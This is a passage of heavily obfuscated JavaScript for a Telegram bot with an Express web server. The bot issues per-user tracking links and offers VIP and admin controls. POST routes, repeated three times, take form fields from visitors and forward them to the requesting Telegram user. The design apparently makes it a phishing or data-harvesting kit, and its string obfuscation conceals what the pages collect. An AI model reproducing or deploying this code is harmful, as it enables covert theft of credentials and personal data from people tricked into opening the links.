                    'callback_data': _0x11a6d5(0x81a) + 'k:' + _0x1fc896
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x77c)],
                    'callback_data': _0x11a6d5(0x35f) + 'n:' + _0x1fc896
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x5ff)],
                    'callback_data': _0x11a6d5(0x276) + 'e:' + _0x1fc896
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x30e)],
                    'callback_data': _0x54b042[_0x11a6d5(0x40c)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x29a)],
                    'callback_data': _0x54b042[_0x11a6d5(0x378)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x5a6)],
                    'callback_data': _0x54b042[_0x11a6d5(0x66b)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x380)],
                    'callback_data': _0x11a6d5(0x1de) + _0x11a6d5(0x762) + _0x1fc896
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x582)],
                    'callback_data': _0x11a6d5(0x485) + _0x11a6d5(0x264) + _0x1fc896
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x5a2)],
                    'callback_data': _0x54b042[_0x11a6d5(0x53c)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x2f4)],
                    'callback_data': _0x54b042[_0x11a6d5(0x6a4)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x1f4)],
                    'callback_data': _0x54b042[_0x11a6d5(0x1ef)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x70e)],
                    'callback_data': _0x11a6d5(0x81e) + 'k:' + _0x1fc896
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x5f1)],
                    'web_app': { 'url': _0x54b042[_0x11a6d5(0x28b)] }
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x591)],
                    'callback_data': _0x54b042[_0x11a6d5(0x785)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x2db)],
                    'web_app': { 'url': _0x54b042[_0x11a6d5(0x79e)] }
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x715)],
                    'callback_data': _0x54b042[_0x11a6d5(0x692)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x567)],
                    'callback_data': _0x54b042[_0x11a6d5(0x401)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x23d)],
                    'web_app': { 'url': _0x54b042[_0x11a6d5(0x249)] }
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x4da)],
                    'url': _0x54b042[_0x11a6d5(0x3ac)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x76a)],
                    'web_app': { 'url': _0x54b042[_0x11a6d5(0x7fa)] }
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x324)],
                    'callback_data': _0x54b042[_0x11a6d5(0x517)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x7d9)],
                    'callback_data': _0x54b042[_0x11a6d5(0x5e7)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x741)],
                    'callback_data': _0x54b042[_0x11a6d5(0x6a1)]
                }
            ],
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x6c5)],
                    'callback_data': _0x54b042[_0x11a6d5(0x4bb)]
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x33d)],
                    'url': _0x54b042[_0x11a6d5(0x806)]
                }
            ]
        ];
    bot[_0x11a6d5(0x273) + 'e'](_0x1fc896, _0x26e90a, { 'reply_markup': { 'inline_keyboard': _0x6902c4 } });
    if (_0x54b042[_0x11a6d5(0x4ff)](_0x1fc896, 0xd002992c + -0xfb4e41dc + 0x399 * 0x6b1dfa)) {
        const _0x33e251 = _0x54b042[_0x11a6d5(0x609)], _0x3918a4 = [[
                    {
                        'text': _0x54b042[_0x11a6d5(0x393)],
                        'callback_data': _0x54b042[_0x11a6d5(0x6ec)]
                    },
                    {
                        'text': _0x54b042[_0x11a6d5(0x36e)],
                        'callback_data': _0x54b042[_0x11a6d5(0x289)]
                    }
                ]];
        bot[_0x11a6d5(0x273) + 'e'](_0x1fc896, _0x33e251, { 'reply_markup': { 'inline_keyboard': _0x3918a4 } });
    }
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x1aae2a => {
    const _0x2d9464 = _0x178009, _0x13f740 = {
            'BjKFI': function (_0x58737e, _0x29e664) {
                return _0x58737e === _0x29e664;
            },
            'yPgmJ': _0x2d9464(0x34f) + _0x2d9464(0x304)
        }, _0x99abf2 = _0x1aae2a[_0x2d9464(0x1e6)][_0x2d9464(0x6a6)]['id'], _0x599aba = _0x1aae2a[_0x2d9464(0x320)];
    if (_0x13f740[_0x2d9464(0x475)](_0x599aba, _0x13f740[_0x2d9464(0x224)])) {
        const _0x14876d = _0x2d9464(0x537) + _0x2d9464(0x5c8) + _0x2d9464(0x262) + _0x2d9464(0x412) + _0x2d9464(0x7c6) + _0x2d9464(0x643) + baseUrl + (_0x2d9464(0x7e9) + _0x2d9464(0x811)) + _0x99abf2;
        bot[_0x2d9464(0x273) + 'e'](_0x99abf2, _0x14876d);
    }
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), async _0x56202a => {
    const _0x194148 = _0x178009, _0x355147 = {
            'VVmKn': function (_0x503060, _0xc29758) {
                return _0x503060(_0xc29758);
            },
            'rafVv': _0x194148(0x63e),
            'Kctxh': _0x194148(0x6a5) + 's',
            'ISfMk': _0x194148(0x71c) + 're',
            'dhRfX': _0x194148(0x1de) + _0x194148(0x4a7),
            'bjTlr': _0x194148(0x4d9),
            'xIjmo': _0x194148(0x81e) + 'k',
            'bTDdZ': _0x194148(0x343),
            'afSzO': _0x194148(0x485) + _0x194148(0x1e9),
            'BtASc': _0x194148(0x6b3) + _0x194148(0x32e) + _0x194148(0x462) + _0x194148(0x3a0) + _0x194148(0x795) + _0x194148(0x25b),
            'eNUjq': function (_0x59607b, _0x3d0e52) {
                return _0x59607b === _0x3d0e52;
            },
            'NhffG': _0x194148(0x733) + _0x194148(0x228),
            'LWPaO': function (_0xd6c4fa, _0x40378f) {
                return _0xd6c4fa === _0x40378f;
            },
            'xPufj': _0x194148(0x6f6),
            'ZLMnO': _0x194148(0x69e) + _0x194148(0x45c) + _0x194148(0x302) + _0x194148(0x253) + _0x194148(0x546) + _0x194148(0x521),
            'wbsKu': _0x194148(0x38e) + _0x194148(0x223) + _0x194148(0x4aa) + _0x194148(0x27f) + 'ns',
            'fXLwF': _0x194148(0x36a) + _0x194148(0x5d5),
            'zvKmU': _0x194148(0x338),
            'rrKYi': _0x194148(0x787) + _0x194148(0x258) + _0x194148(0x400) + _0x194148(0x46a) + _0x194148(0x53a) + _0x194148(0x26d) + _0x194148(0x4ce) + _0x194148(0x4fc) + _0x194148(0x5b5) + _0x194148(0x2bf) + 'cA',
            'oydvO': _0x194148(0x60b) + _0x194148(0x256),
            'OtMMX': _0x194148(0x3f8) + _0x194148(0x42f),
            'EncYT': _0x194148(0x6ad) + _0x194148(0x407) + _0x194148(0x641) + _0x194148(0x44d) + _0x194148(0x4a3) + _0x194148(0x592) + _0x194148(0x4e8),
            'IreNn': function (_0x257b03, _0x3948f3) {
                return _0x257b03 === _0x3948f3;
            },
            'TiFOa': _0x194148(0x48d) + _0x194148(0x43b),
            'SbFxQ': _0x194148(0x31c) + _0x194148(0x277) + _0x194148(0x722) + _0x194148(0x3ff) + _0x194148(0x755) + _0x194148(0x7ca) + _0x194148(0x32f) + _0x194148(0x57d) + _0x194148(0x724) + _0x194148(0x2ba) + _0x194148(0x64d) + _0x194148(0x7c3) + _0x194148(0x426) + _0x194148(0x608) + _0x194148(0x3d8) + _0x194148(0x260),
            'pEGhj': function (_0x4f89c7, _0x101ccd) {
                return _0x4f89c7 === _0x101ccd;
            },
            'LPQKu': _0x194148(0x3f8) + _0x194148(0x719) + _0x194148(0x3b2),
            'mdEsM': _0x194148(0x6ad) + _0x194148(0x407) + _0x194148(0x3d2) + _0x194148(0x6d5) + _0x194148(0x504) + _0x194148(0x44b) + _0x194148(0x64c),
            'sSDqD': function (_0x56676e, _0x2e348b) {
                return _0x56676e === _0x2e348b;
            },
            'QwbwO': _0x194148(0x7eb),
            'dkRrB': function (_0x24bbd8, _0x23d788) {
                return _0x24bbd8 == _0x23d788;
            },
            'QdCUy': _0x194148(0x1cd) + _0x194148(0x2ce) + _0x194148(0x2ab) + _0x194148(0x3b0) + 'P:',
            'irRyb': _0x194148(0x1e6),
            'SOlrK': function (_0xb27184, _0x4f0c1d) {
                return _0xb27184 === _0x4f0c1d;
            },
            'bWGqX': _0x194148(0x418),
            'VVuei': _0x194148(0x1cd) + _0x194148(0x2ce) + _0x194148(0x630) + _0x194148(0x2c0) + 'P:',
            'mGIxl': function (_0x57a63c, _0x295add, _0x3361d9) {
                return _0x57a63c(_0x295add, _0x3361d9);
            },
            'Ireax': _0x194148(0x31d) + 'nt',
            'uuNCM': _0x194148(0x511),
            'Xosye': _0x194148(0x81a) + 'k',
            'zbECK': _0x194148(0x35f) + 'n',
            'oyHUp': _0x194148(0x276) + 'e'
        }, _0x515dde = _0x56202a[_0x194148(0x1e6)][_0x194148(0x6a6)]['id'], _0x21480b = _0x56202a[_0x194148(0x320)], _0x163593 = [
            _0x355147[_0x194148(0x706)],
            _0x355147[_0x194148(0x80b)],
            _0x355147[_0x194148(0x50f)],
            _0x355147[_0x194148(0x40b)],
            _0x355147[_0x194148(0x3ee)],
            _0x355147[_0x194148(0x32b)],
            _0x355147[_0x194148(0x2cd)],
            _0x355147[_0x194148(0x40d)]
        ];
    if (!_0x163593[_0x194148(0x5cc)](_0x21480b[_0x194148(0x577)](':')[0x1bc5 + -0x1 * 0x1b56 + -0x6f * 0x1]) && !await _0x355147[_0x194148(0x519)](isUserSubscribed, _0x515dde)) {
        const _0x115bcc = _0x355147[_0x194148(0x6fb)], _0x16a11d = developerChannels[_0x194148(0x552)](_0x5f2ef6 => ({
                'text': _0x194148(0x56d) + _0x5f2ef6,
                'url': _0x194148(0x4d1) + _0x194148(0x681) + _0x5f2ef6[_0x194148(0x56e)](-0x82b + -0x1 * -0x29 + -0x125 * -0x7)
            }));
        bot[_0x194148(0x273) + 'e'](_0x515dde, _0x115bcc, { 'reply_markup': { 'inline_keyboard': [_0x16a11d] } });
        return;
    }
    if (_0x355147[_0x194148(0x230)](_0x21480b, _0x355147[_0x194148(0x21c)])) {
        const _0xfd8ab0 = baseUrl + (_0x194148(0x6c8) + _0x194148(0x2d9)) + _0x515dde;
        bot[_0x194148(0x273) + 'e'](_0x515dde, _0x194148(0x537) + _0x194148(0x46d) + _0x194148(0x35d) + '\x20' + _0xfd8ab0);
        return;
    }
    const [_0x3d95c8, _0x2d0c19] = _0x21480b[_0x194148(0x577)](':');
    if (_0x355147[_0x194148(0x6cc)](_0x3d95c8, _0x355147[_0x194148(0x607)]))
        try {
            const _0x1d7ba2 = _0x355147[_0x194148(0x3cb)], _0x427b33 = _0x355147[_0x194148(0x471)], _0x6645bb = await axios[_0x194148(0x25e)](_0x427b33, {
                    'model': _0x355147[_0x194148(0x6d2)],
                    'messages': [{
                            'role': _0x355147[_0x194148(0x3d4)],
                            'content': _0x1d7ba2
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x355147[_0x194148(0x7ab)],
                        'Content-Type': _0x355147[_0x194148(0x783)]
                    }
                }), _0x48b9a8 = _0x6645bb[_0x194148(0x320)][_0x194148(0x39f)][0x5f8 + 0x1 * 0x21bd + -0x27b5][_0x194148(0x1e6)][_0x194148(0x2be)];
            bot[_0x194148(0x273) + 'e'](_0x515dde, _0x48b9a8);
        } catch (_0x4578f9) {
            console[_0x194148(0x6d0)](_0x355147[_0x194148(0x562)], _0x4578f9[_0x194148(0x246)] ? _0x4578f9[_0x194148(0x246)][_0x194148(0x320)] : _0x4578f9[_0x194148(0x1e6)]), bot[_0x194148(0x273) + 'e'](_0x515dde, _0x355147[_0x194148(0x227)]);
        }
    else {
        if (_0x355147[_0x194148(0x377)](_0x21480b, _0x355147[_0x194148(0x35c)]))
            try {
                const _0x5ee447 = _0x355147[_0x194148(0x355)], _0x508bb7 = _0x355147[_0x194148(0x471)], _0xd86ded = await axios[_0x194148(0x25e)](_0x508bb7, {
                        'model': _0x355147[_0x194148(0x6d2)],
                        'messages': [{
                                'role': _0x355147[_0x194148(0x3d4)],
                                'content': _0x5ee447
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x355147[_0x194148(0x7ab)],
                            'Content-Type': _0x355147[_0x194148(0x783)]
                        }
                    }), _0xc290e5 = _0xd86ded[_0x194148(0x320)][_0x194148(0x39f)][0x1933 + 0x4f6 + 0x1e29 * -0x1][_0x194148(0x1e6)][_0x194148(0x2be)];
                bot[_0x194148(0x273) + 'e'](_0x515dde, _0xc290e5);
            } catch (_0x1b220e) {
                console[_0x194148(0x6d0)](_0x355147[_0x194148(0x562)], _0x1b220e[_0x194148(0x246)] ? _0x1b220e[_0x194148(0x246)][_0x194148(0x320)] : _0x1b220e[_0x194148(0x1e6)]), bot[_0x194148(0x273) + 'e'](_0x515dde, _0x355147[_0x194148(0x227)]);
            }
        else {
            if (_0x355147[_0x194148(0x68b)](_0x21480b, _0x355147[_0x194148(0x35c)]))
                try {
                    const _0x2645c1 = _0x355147[_0x194148(0x355)], _0x3d621c = _0x355147[_0x194148(0x471)], _0x4674ab = await axios[_0x194148(0x25e)](_0x3d621c, {
                            'model': _0x355147[_0x194148(0x6d2)],
                            'messages': [{
                                    'role': _0x355147[_0x194148(0x3d4)],
                                    'content': _0x2645c1
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x355147[_0x194148(0x7ab)],
                                'Content-Type': _0x355147[_0x194148(0x783)]
                            }
                        }), _0x49c5e6 = _0x4674ab[_0x194148(0x320)][_0x194148(0x39f)][-0x1c3 + -0xb * -0x11 + 0x108][_0x194148(0x1e6)][_0x194148(0x2be)];
                    bot[_0x194148(0x273) + 'e'](_0x515dde, _0x49c5e6);
                } catch (_0x2a7175) {
                    console[_0x194148(0x6d0)](_0x355147[_0x194148(0x707)], _0x2a7175[_0x194148(0x246)] ? _0x2a7175[_0x194148(0x246)][_0x194148(0x320)] : _0x2a7175[_0x194148(0x1e6)]), bot[_0x194148(0x273) + 'e'](_0x515dde, _0x355147[_0x194148(0x499)]);
                }
            else {
                if (_0x355147[_0x194148(0x5a8)](_0x21480b, _0x355147[_0x194148(0x2c7)]) && _0x355147[_0x194148(0x24e)](_0x515dde, -0x6a61157b + 0x2a730c9c4 + -0xe6bc848f))
                    bot[_0x194148(0x273) + 'e'](_0x515dde, _0x355147[_0x194148(0x4bd)]), bot[_0x194148(0x3c1)](_0x355147[_0x194148(0x734)], _0x27b57b => {
                        const _0x19248a = _0x194148, _0x3575d2 = _0x27b57b[_0x19248a(0x62f)];
                        _0x355147[_0x19248a(0x519)](addVIPUser, _0x3575d2), bot[_0x19248a(0x273) + 'e'](_0x515dde, _0x19248a(0x54b) + _0x19248a(0x5b3) + _0x3575d2 + _0x19248a(0x5bc));
                    });
                else {
                    if (_0x355147[_0x194148(0x5f7)](_0x21480b, _0x355147[_0x194148(0x69a)]) && _0x355147[_0x194148(0x24e)](_0x515dde, 0x86 * 0xe277b3 + -0x6d5715a2 + -0x3d37d66 * -0x57))
                        bot[_0x194148(0x273) + 'e'](_0x515dde, _0x355147[_0x194148(0x686)]), bot[_0x194148(0x3c1)](_0x355147[_0x194148(0x734)], _0x4a2503 => {
                            const _0x2f65d5 = _0x194148, _0x10fc30 = _0x4a2503[_0x2f65d5(0x62f)];
                            _0x355147[_0x2f65d5(0x519)](removeVIPUser, _0x10fc30), bot[_0x2f65d5(0x273) + 'e'](_0x515dde, _0x2f65d5(0x5df) + _0x2f65d5(0x5b3) + _0x10fc30 + _0x2f65d5(0x3fd));
                        });
                    else {
                        const [_0x4e85c5, _0xdc2b4] = _0x21480b[_0x194148(0x577)](':');
                        if (!_0x163593[_0x194148(0x5cc)](_0x4e85c5) && !_0x355147[_0x194148(0x2c1)](validateLinkUsage, _0xdc2b4, _0x4e85c5)) {
                            bot[_0x194148(0x273) + 'e'](_0x515dde, '');
                            return;
                        }
                        let _0x453865 = '';
                        switch (_0x4e85c5) {
                        case _0x355147[_0x194148(0x33f)]:
                            _0x453865 = baseUrl + (_0x194148(0x356) + _0x194148(0x1e8)) + crypto[_0x194148(0x436) + 's'](0x42 * -0x74 + -0x15b3 + 0x33ab)[_0x194148(0x4b1)](_0x355147[_0x194148(0x69c)]) + _0x194148(0x39c) + _0x515dde;
                            break;
                        case _0x355147[_0x194148(0x799)]:
                            _0x453865 = baseUrl + (_0x194148(0x1d8) + _0x194148(0x770)) + crypto[_0x194148(0x436) + 's'](0x1 * 0xa9f + 0x2 * 0xa42 + -0x1f13)[_0x194148(0x4b1)](_0x355147[_0x194148(0x69c)]) + _0x194148(0x39c) + _0x515dde;
                            break;
                        case _0x355147[_0x194148(0x489)]:
                            _0x453865 = baseUrl + (_0x194148(0x431) + _0x194148(0x453)) + crypto[_0x194148(0x436) + 's'](0xb8d * 0x1 + 0xce9 + -0x411 * 0x6)[_0x194148(0x4b1)](_0x355147[_0x194148(0x69c)]) + _0x194148(0x39c) + _0x515dde;
                            break;
                        case _0x355147[_0x194148(0x6f7)]:
                            const _0x251d40 = 0x1228 + -0x9 * 0x203 + 0x1 * -0x3;
                            _0x453865 = baseUrl + _0x194148(0x257) + crypto[_0x194148(0x436) + 's'](0x3b1 + -0x2 * -0xfad + -0x22fb)[_0x194148(0x4b1)](_0x355147[_0x194148(0x69c)]) + _0x194148(0x39c) + _0x515dde + _0x194148(0x1dc) + _0x251d40;
                            break;
                        case _0x355147[_0x194148(0x32b)]:
                            _0x453865 = baseUrl + (_0x194148(0x536) + _0x194148(0x689)) + _0x515dde + (_0x194148(0x6f2) + 'ok');
                            break;
                        case _0x355147[_0x194148(0x40b)]:
                            _0x453865 = baseUrl + (_0x194148(0x536) + _0x194148(0x689)) + _0x515dde + (_0x194148(0x7c4) + _0x194148(0x395));
                            break;
                        case _0x355147[_0x194148(0x40d)]:
                            _0x453865 = baseUrl + (_0x194148(0x536) + _0x194148(0x689)) + _0x515dde + (_0x194148(0x69d) + _0x194148(0x7a8));
                            break;
                        default:
                            bot[_0x194148(0x273) + 'e'](_0x515dde, '');
                            return;
                        }
                        bot[_0x194148(0x273) + 'e'](_0x515dde, _0x194148(0x56a) + _0x194148(0x7a6) + _0x453865);
                    }
                }
            }
        }
    }
    bot[_0x194148(0x3fa) + _0x194148(0x21a)](_0x56202a['id']);
}), bot[_0x178009(0x645)](/\/jjihigjoj/, _0x5c1015 => {
    const _0x3e7ce9 = _0x178009, _0x5d00d2 = {
            'MMQGk': _0x3e7ce9(0x750) + _0x3e7ce9(0x27a) + _0x3e7ce9(0x4ec) + _0x3e7ce9(0x587) + '.',
            'DTBae': _0x3e7ce9(0x712) + _0x3e7ce9(0x538),
            'HeIyF': _0x3e7ce9(0x312) + _0x3e7ce9(0x23f)
        }, _0x22e9f4 = _0x5c1015[_0x3e7ce9(0x6a6)]['id'], _0x4c3117 = _0x5d00d2[_0x3e7ce9(0x24a)];
    bot[_0x3e7ce9(0x273) + 'e'](_0x22e9f4, _0x4c3117, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x5d00d2[_0x3e7ce9(0x3f0)],
                        'callback_data': _0x5d00d2[_0x3e7ce9(0x254)]
                    }]]
        }
    });
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x55e77d => {
    const _0x1bfed1 = _0x178009, _0x45c168 = {
            'UHhSP': function (_0x225994, _0x4d43a6) {
                return _0x225994 === _0x4d43a6;
            },
            'LBJir': _0x1bfed1(0x312) + _0x1bfed1(0x23f)
        }, _0x490a36 = _0x55e77d[_0x1bfed1(0x1e6)][_0x1bfed1(0x6a6)]['id'];
    if (_0x45c168[_0x1bfed1(0x7aa)](_0x55e77d[_0x1bfed1(0x320)], _0x45c168[_0x1bfed1(0x1da)])) {
        const _0x11faf5 = baseUrl + '/' + _0x490a36;
        bot[_0x1bfed1(0x273) + 'e'](_0x490a36, _0x1bfed1(0x69b) + _0x1bfed1(0x2c2) + _0x11faf5);
    }
    bot[_0x1bfed1(0x3fa) + _0x1bfed1(0x21a)](_0x55e77d['id']);
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x294687 => {
    const _0x17a0a8 = _0x178009, _0xe716b8 = {
            'PYpxh': function (_0x32b0b5, _0x7c6c44) {
                return _0x32b0b5 === _0x7c6c44;
            },
            'uxWWl': _0x17a0a8(0x6fe),
            'jpLEh': _0x17a0a8(0x1e6),
            'fAPLh': _0x17a0a8(0x4ca) + _0x17a0a8(0x2aa) + _0x17a0a8(0x284) + _0x17a0a8(0x72c),
            'ysZhH': function (_0x102cda, _0x572809) {
                return _0x102cda === _0x572809;
            },
            'JRYSs': _0x17a0a8(0x6b6),
            'nopxl': _0x17a0a8(0x446) + _0x17a0a8(0x65b) + _0x17a0a8(0x61a) + '.'
        }, _0xc5ab13 = _0x294687[_0x17a0a8(0x1e6)][_0x17a0a8(0x6a6)]['id'];
    if (_0xe716b8[_0x17a0a8(0x357)](_0x294687[_0x17a0a8(0x320)], _0xe716b8[_0x17a0a8(0x524)])) {
        bot[_0x17a0a8(0x273) + 'e'](_0xc5ab13, _0xe716b8[_0x17a0a8(0x40a)]);
        const _0x410c1d = _0x5c0b49 => {
            const _0x3e6c2f = _0x17a0a8;
            if (_0xe716b8[_0x3e6c2f(0x500)](_0x5c0b49[_0x3e6c2f(0x6a6)]['id'], _0xc5ab13)) {
                if (_0x5c0b49[_0x3e6c2f(0x62f)] && _0x5c0b49[_0x3e6c2f(0x62f)][_0x3e6c2f(0x1ec)](_0xe716b8[_0x3e6c2f(0x3e3)])) {
                    const _0x223d7b = _0x5c0b49[_0x3e6c2f(0x62f)];
                    dataStore[_0xc5ab13] = { 'userLink': _0x223d7b }, bot[_0x3e6c2f(0x273) + 'e'](_0xc5ab13, _0x3e6c2f(0x250) + _0x3e6c2f(0x7df) + _0x3e6c2f(0x4dc) + baseUrl + (_0x3e6c2f(0x3cf) + _0x3e6c2f(0x74c)) + _0xc5ab13), bot[_0x3e6c2f(0x5c1) + _0x3e6c2f(0x4d5)](_0xe716b8[_0x3e6c2f(0x310)], _0x410c1d);
                } else
                    bot[_0x3e6c2f(0x273) + 'e'](_0xc5ab13, _0xe716b8[_0x3e6c2f(0x28d)]);
            }
        };
        bot['on'](_0xe716b8[_0x17a0a8(0x310)], _0x410c1d);
    }
}), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x388)]({ 'extended': !![] })), app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname)), app[_0x178009(0x25e)](_0x178009(0x1ed) + 'es', (_0x3cc3e7, _0x21ad8a) => {
    const _0x2607d0 = _0x178009, _0x2cdd95 = {
            'CBoaA': _0x2607d0(0x316),
            'DfYZt': _0x2607d0(0x4e6) + _0x2607d0(0x271) + _0x2607d0(0x757) + ':',
            'IMzxy': _0x2607d0(0x6ad) + _0x2607d0(0x5e5) + _0x2607d0(0x4a8) + _0x2607d0(0x510) + _0x2607d0(0x71a),
            'wlGRF': _0x2607d0(0x518) + _0x2607d0(0x1e2)
        }, _0x253a48 = _0x3cc3e7[_0x2607d0(0x4d8)][_0x2607d0(0x5cb)], _0x3c63ff = _0x3cc3e7[_0x2607d0(0x4d8)][_0x2607d0(0x57e)], _0x1485d2 = _0x3cc3e7[_0x2607d0(0x4d8)][_0x2607d0(0x1ee)];
    console[_0x2607d0(0x22e)](_0x2cdd95[_0x2607d0(0x6e1)], _0x3cc3e7[_0x2607d0(0x4d8)]), bot[_0x2607d0(0x273) + 'e'](_0x253a48, _0x2607d0(0x3bb) + _0x2607d0(0x221) + _0x3c63ff + _0x2607d0(0x70f) + _0x1485d2)[_0x2607d0(0x3e0)](() => {
        const _0x3f1699 = _0x2607d0;
        _0x21ad8a[_0x3f1699(0x4c1)](path[_0x3f1699(0x2a7)](__dirname, _0x2cdd95[_0x3f1699(0x58d)]));
    })[_0x2607d0(0x3d1)](_0x4406ed => {
        const _0x5bbb3f = _0x2607d0;
        console[_0x5bbb3f(0x6d0)](_0x2cdd95[_0x5bbb3f(0x7c1)], _0x4406ed[_0x5bbb3f(0x246)] ? _0x4406ed[_0x5bbb3f(0x246)][_0x5bbb3f(0x4d8)] : _0x4406ed), _0x21ad8a[_0x5bbb3f(0x4e9)](0x17e0 + 0x4e * 0x1d + -0x1ec2)[_0x5bbb3f(0x74b)](_0x2cdd95[_0x5bbb3f(0x72a)]);
    });
}), app[_0x178009(0x344)](_0x178009(0x319), (_0x27be14, _0x30775b) => {
    const _0x3c7ba5 = _0x178009, _0x16c747 = {
            'uZiiY': _0x3c7ba5(0x749) + _0x3c7ba5(0x5a5) + _0x3c7ba5(0x229),
            'ruqbQ': _0x3c7ba5(0x316)
        }, _0x3b4d6f = _0x27be14[_0x3c7ba5(0x62d)][_0x3c7ba5(0x5cb)];
    if (!_0x3b4d6f)
        return _0x30775b[_0x3c7ba5(0x4e9)](-0x4 * 0x46 + -0x22b3 + -0x49 * -0x83)[_0x3c7ba5(0x74b)](_0x16c747[_0x3c7ba5(0x649)]);
    _0x30775b[_0x3c7ba5(0x4c1)](path[_0x3c7ba5(0x2a7)](__dirname, _0x16c747[_0x3c7ba5(0x701)]));
}), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x388)]({ 'extended': !![] })), app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname)), app[_0x178009(0x25e)](_0x178009(0x1ed) + 'es', (_0x1dae72, _0x1b2edc) => {
    const _0x4ac7f0 = _0x178009, _0x1e9e9a = {
            'iDASY': _0x4ac7f0(0x2b0),
            'rhYCi': _0x4ac7f0(0x4e6) + _0x4ac7f0(0x271) + _0x4ac7f0(0x757) + ':',
            'HzARI': _0x4ac7f0(0x6ad) + _0x4ac7f0(0x5e5) + _0x4ac7f0(0x4a8) + _0x4ac7f0(0x510) + _0x4ac7f0(0x71a),
            'VcOFF': _0x4ac7f0(0x518) + _0x4ac7f0(0x1e2)
        }, _0x3b9945 = _0x1dae72[_0x4ac7f0(0x4d8)][_0x4ac7f0(0x5cb)], _0x5bb6c7 = _0x1dae72[_0x4ac7f0(0x4d8)][_0x4ac7f0(0x57e)], _0x107817 = _0x1dae72[_0x4ac7f0(0x4d8)][_0x4ac7f0(0x1ee)];
    console[_0x4ac7f0(0x22e)](_0x1e9e9a[_0x4ac7f0(0x534)], _0x1dae72[_0x4ac7f0(0x4d8)]), bot[_0x4ac7f0(0x273) + 'e'](_0x3b9945, _0x4ac7f0(0x3bb) + _0x4ac7f0(0x221) + _0x5bb6c7 + _0x4ac7f0(0x70f) + _0x107817)[_0x4ac7f0(0x3e0)](() => {
        const _0x585a0e = _0x4ac7f0;
        _0x1b2edc[_0x585a0e(0x4c1)](path[_0x585a0e(0x2a7)](__dirname, _0x1e9e9a[_0x585a0e(0x684)]));
    })[_0x4ac7f0(0x3d1)](_0x199540 => {
        const _0x5c3757 = _0x4ac7f0;
        console[_0x5c3757(0x6d0)](_0x1e9e9a[_0x5c3757(0x7db)], _0x199540[_0x5c3757(0x246)] ? _0x199540[_0x5c3757(0x246)][_0x5c3757(0x4d8)] : _0x199540), _0x1b2edc[_0x5c3757(0x4e9)](-0xa32 + 0x1e04 + -0x11de)[_0x5c3757(0x74b)](_0x1e9e9a[_0x5c3757(0x6dd)]);
    });
}), app[_0x178009(0x344)](_0x178009(0x496), (_0x4f284e, _0x297452) => {
    const _0x12461d = _0x178009, _0x18c77e = {
            'sbqeF': _0x12461d(0x749) + _0x12461d(0x5a5) + _0x12461d(0x229),
            'luVen': _0x12461d(0x2b0)
        }, _0x426359 = _0x4f284e[_0x12461d(0x62d)][_0x12461d(0x5cb)];
    if (!_0x426359)
        return _0x297452[_0x12461d(0x4e9)](0x850 + -0x2377 + -0x1 * -0x1cb7)[_0x12461d(0x74b)](_0x18c77e[_0x12461d(0x403)]);
    _0x297452[_0x12461d(0x4c1)](path[_0x12461d(0x2a7)](__dirname, _0x18c77e[_0x12461d(0x7b9)]));
}), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x388)]({ 'extended': !![] })), app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname)), app[_0x178009(0x25e)](_0x178009(0x1ed) + 'es', (_0x1f6b2d, _0x3784ca) => {
    const _0x3f4564 = _0x178009, _0x5c4742 = {
            'hAeEN': _0x3f4564(0x6df),
            'dYTxW': _0x3f4564(0x4e6) + _0x3f4564(0x271) + _0x3f4564(0x757) + ':',
            'zwcMa': _0x3f4564(0x6ad) + _0x3f4564(0x5e5) + _0x3f4564(0x4a8) + _0x3f4564(0x510) + _0x3f4564(0x71a),
            'wIxKG': _0x3f4564(0x518) + _0x3f4564(0x1e2)
        }, _0x16e540 = _0x1f6b2d[_0x3f4564(0x4d8)][_0x3f4564(0x5cb)], _0x1c5e40 = _0x1f6b2d[_0x3f4564(0x4d8)][_0x3f4564(0x57e)], _0xa3ed08 = _0x1f6b2d[_0x3f4564(0x4d8)][_0x3f4564(0x1ee)];
    console[_0x3f4564(0x22e)](_0x5c4742[_0x3f4564(0x80d)], _0x1f6b2d[_0x3f4564(0x4d8)]), bot[_0x3f4564(0x273) + 'e'](_0x16e540, _0x3f4564(0x3bb) + _0x3f4564(0x221) + _0x1c5e40 + _0x3f4564(0x70f) + _0xa3ed08)[_0x3f4564(0x3e0)](() => {
        const _0x17ed2f = _0x3f4564;
        _0x3784ca[_0x17ed2f(0x4c1)](path[_0x17ed2f(0x2a7)](__dirname, _0x5c4742[_0x17ed2f(0x47d)]));
